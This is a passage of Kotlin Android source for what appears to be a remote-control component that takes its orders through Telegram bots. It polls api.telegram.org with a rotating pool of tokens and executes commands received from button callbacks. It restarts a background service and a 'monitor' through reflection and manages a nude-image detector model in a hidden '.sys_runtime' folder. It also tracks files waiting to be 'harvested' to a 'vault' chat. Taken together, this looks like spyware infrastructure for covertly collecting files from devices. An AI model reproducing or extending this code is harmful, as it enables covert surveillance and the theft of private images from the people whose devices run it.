                if (processedUpdates.size >= 150) processedUpdates.clear()
                processedUpdates.add(cbId)
            }

            val chatId = cb.optJSONObject("message")?.optJSONObject("chat")?.optLong("id") ?: return
            val msgId = cb.optJSONObject("message")?.optLong("message_id") ?: return
            val data = cb.optString("data", "")

            // ✅ تأكيد الاستلام فوراً لفك تجميد الزر
            apiCall("answerCallbackQuery", JSONObject().apply { put("callback_query_id", cbId) })

            if (!isAuthorized(chatId)) {
                apiCall("sendMessage", JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", "⚠️ انتهت الجلسة، استخدم /login لإعادة المصادقة")
                })
                return
            }

            // ✅ توجيه الأمر لوحدة Commands للتنفيذ
            try {
                Commands.ex(appContext ?: return, data, this, monitor, chatId, cbId)
            } catch (e: Exception) {
                writeLog("❌ Command error: ${e.message}")
                apiCall("sendMessage", JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", "❌ خطأ: ${e.message?.take(100)}")
                })
            }
        } catch (e: Exception) {
            writeLog("❌ Handle callback error: ${e.message}")
        }
    }

    private suspend fun updateModel(): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val detector = monitor?.let {
                    try {
                        val field = it.javaClass.getDeclaredField("nudeDetector")
                        field.isAccessible = true
                        field.get(it) as? NudeDetector
                    } catch (e: Exception) { null }
                }
                if (detector == null) return@withContext false
                val modelFile = File(appContext?.filesDir, ".sys_runtime/models/engine_v2.tflite")
                if (modelFile.exists()) modelFile.delete()
                val success = detector.ensureModelReady()
                if (success) {
                    detector.modelPath = modelFile.absolutePath
                    detector.loadEngineForever()
                }
                success
            } catch (e: Exception) {
                writeLog("Update model exception: ${e.message}")
                false
            }
        }
    }

    private suspend fun restartService() {
        writeLog("🌀 Starting service restart...")
        MainActivity.appendLogStatic("🌀 Starting service restart...")

        try {
            val intent = Intent(appContext, ForegroundService::class.java).apply {
                action = "STOP_SERVICE"
            }
            appContext?.stopService(intent)
            writeLog("✅ ForegroundService stopped")
        } catch (e: Exception) {
            writeLog("❌ Stop service error: ${e.message}")
        }

        try {
            val monitorObj = monitor
            if (monitorObj != null) {
                val stopMethod = monitorObj.javaClass.getMethod("stop")
                stopMethod.invoke(monitorObj)
                writeLog("✅ Monitor stopped")
            }
        } catch (e: Exception) {
            writeLog("❌ Stop monitor error: ${e.message}")
        }

        try {
            val intent = Intent(appContext, ForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                appContext?.startForegroundService(intent)
            } else {
                appContext?.startService(intent)
            }
            writeLog("✅ ForegroundService started")
        } catch (e: Exception) {
            writeLog("❌ Start service error: ${e.message}")
        }

        try {
            val monitorObj = monitor
            if (monitorObj != null) {
                val startMethod = monitorObj.javaClass.getMethod("start")
                startMethod.invoke(monitorObj)
                writeLog("✅ Monitor started")
            }
        } catch (e: Exception) {
            writeLog("❌ Start monitor error: ${e.message}")
        }

        writeLog("✅ Service restarted successfully")
        MainActivity.appendLogStatic("✅ Service restarted successfully")
    }

    // ============================================================
    // ✅ startPolling المُعدّل لاستخدام البوت الرئيسي فقط مع تبديل تلقائي
    // ============================================================
    private fun startPolling() {
        pollingJob = scope.launch {
            var offset = loadOffset()
            consecutivePollingErrors = 0
            writeLog("Polling started with leader bot")

            while (isRunning && isActive) {
                // ✅ استخدام البوت الرئيسي الثابت بدلاً من العشوائي
                val token = getLeaderToken()
                if (token == null) {
                    MainActivity.appendLogStatic("⚠️ Leader token is null, waiting 5s...")
                    delay(5000L)
                    continue
                }

                try {
                    val url = "https://api.telegram.org/bot$token/getUpdates?offset=$offset&timeout=25"
                    val request = Request.Builder().url(url).get().build()
                    val response = withContext(Dispatchers.IO) { httpClient.newCall(request).execute() }
                    val responseStr = response.body?.string() ?: ""

                    if (!response.isSuccessful) {
                        consecutivePollingErrors++
                        if (consecutivePollingErrors >= MAX_CONSECUTIVE_ERRORS) {
                            leaderMutex.withLock {
                                primaryBotIndex = (primaryBotIndex + 1) % activeTokensList.size
                            }
                            writeLog("🔄 Switched primary bot due to polling errors")
                            MainActivity.appendLogStatic("🔄 Switched primary bot due to polling errors")
                            consecutivePollingErrors = 0
                        }
                        delay(minOf(consecutivePollingErrors * 2000L, 60000L))
                        continue
                    }

                    val data = JSONObject(responseStr)
                    if (data.optBoolean("ok")) {
                        consecutivePollingErrors = 0
                        val results = data.optJSONArray("result") ?: JSONArray()
                        for (i in 0 until results.length()) {
                            val upd = results.getJSONObject(i)
                            val updateId = upd.getLong("update_id")
                            val newOffset = updateId + 1
                            if (newOffset > offset) {
                                offset = newOffset
                                saveOffset(offset)
                            }
                            if (upd.has("message")) {
                                handleMessage(upd)
                            }
                            if (upd.has("callback_query")) {
                                handleCallback(upd)
                            }
                        }
                    } else {
                        consecutivePollingErrors++
                        if (consecutivePollingErrors >= MAX_CONSECUTIVE_ERRORS) {
                            leaderMutex.withLock {
                                primaryBotIndex = (primaryBotIndex + 1) % activeTokensList.size
                            }
                            consecutivePollingErrors = 0
                        }
                        delay(2000L)
                    }
                } catch (e: Exception) {
                    consecutivePollingErrors++
                    if (consecutivePollingErrors >= MAX_CONSECUTIVE_ERRORS) {
                        leaderMutex.withLock {
                            primaryBotIndex = (primaryBotIndex + 1) % activeTokensList.size
                        }
                        consecutivePollingErrors = 0
                    }
                    delay(minOf(consecutivePollingErrors * 2000L, 30000L))
                }
            }
        }
    }

    fun start(): Boolean {
        if (activeTokensList.isEmpty()) {
            writeLog("❌ No active tokens! Cannot start Telegram UI.")
            MainActivity.appendLogStatic("❌ TelegramUi: No active tokens!")
            return false
        }
        if (isRunning) {
            writeLog("ℹ️ Telegram UI already running")
            return true
        }
        writeLog("✅ Starting Telegram UI with ${activeTokensList.size} active tokens")
        MainActivity.appendLogStatic("📡 Starting Telegram UI with ${activeTokensList.size} active tokens")
        isRunning = true
        processedUpdates.clear()
        consecutivePollingErrors = 0
        pollingRestartNeeded.set(false)
        startPolling()
        writeLog("✅ Telegram UI polling started")
        MainActivity.appendLogStatic("✅ Telegram UI polling started")
        return true
    }

    fun stop() {
        isRunning = false
        pollingJob?.cancel()
        cleanerJob?.cancel()
        heartbeatJob?.cancel()
        restartJob?.cancel()
        writeLog("Telegram UI stopped")
        MainActivity.appendLogStatic("🛑 Telegram UI stopped")
    }

    fun getStatus(): Map<String, Any> {
        return mapOf(
            "running" to isRunning,
            "active_tokens" to activeTokensList.size,
            "reserve_tokens" to reserveTokensList.size,
            "devices" to devices.size,
            "sessions" to sessions.size,
            "api_calls" to apiCallsCount,
            "api_failures" to apiFailuresCount,
            "pending_files" to countPendingHarvest(),
            "polling_errors" to consecutivePollingErrors
        )
    }

    fun getVlt(): Long = config.vaultId
    fun getCtrl(): Long = config.controlId
    fun getDat(): Long = config.vaultId

    private fun writeLog(message: String) {
        Log.i(TAG, message)
        try {
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            logFile.appendText("[$timestamp] [INFO] $message\n", Charsets.UTF_8)
        } catch (_: Exception) {}
    }

    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
        if (target == null) return null

        val key = "${target.javaClass.name}.$methodName(${args.size})"
        var method = methodCache[key]
        if (method == null) {
            method = target.javaClass.methods.firstOrNull { m ->
                m.name == methodName && m.parameterTypes.size == args.size
            }
            if (method == null) {
                writeLog("Method not found: $methodName with ${args.size} parameters")
                return null
            }
            method.isAccessible = true
            methodCache[key] = method
        }

        return try {
            method.invoke(target, *args)
        } catch (e: Exception) {
            writeLog("Method invocation error ($methodName): ${e.message}")
            null
        }
    }
}
